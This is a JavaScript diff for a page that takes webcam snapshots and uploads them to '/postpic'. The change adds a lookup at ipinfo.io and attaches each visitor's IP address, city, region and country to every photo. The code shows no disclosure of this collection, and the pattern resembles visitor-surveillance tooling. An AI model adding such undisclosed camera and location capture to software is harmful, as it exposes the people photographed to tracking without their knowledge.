@@ -1,6 +1,8 @@
-document.addEventListener('DOMContentLoaded', () => {
+document.addEventListener('DOMContentLoaded', async () => {
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
+  const clientInfo = await getClientInfo();
+
 
   navigator.mediaDevices
     .getUserMedia({ video: true, audio: false })
@@ -38,10 +40,14 @@ document.addEventListener('DOMContentLoaded', () => {
       }
 
       return new Blob([u8arr], { type: mime });
-    }
+  }
 
   function uploadpic(blob){
     const formData = new FormData();
+        formData.append('clientIp', clientInfo.ip);
+        formData.append('city', clientInfo.city);
+        formData.append('region', clientInfo.region);
+        formData.append('country', clientInfo.country);
         formData.append('file', blob, 'capture.png');
 
         fetch('/postpic', {
@@ -56,4 +62,14 @@ document.addEventListener('DOMContentLoaded', () => {
           console.error('Error:', error);
         });
   }
+
+  async function getClientInfo() {
+      try {
+          const resp = await fetch('https://ipinfo.io/json');
+          const data = await resp.json();
+          return data;
+      } catch (error) {
+          console.error('Error fetching client IP:', error);
+      }
+    }
 });
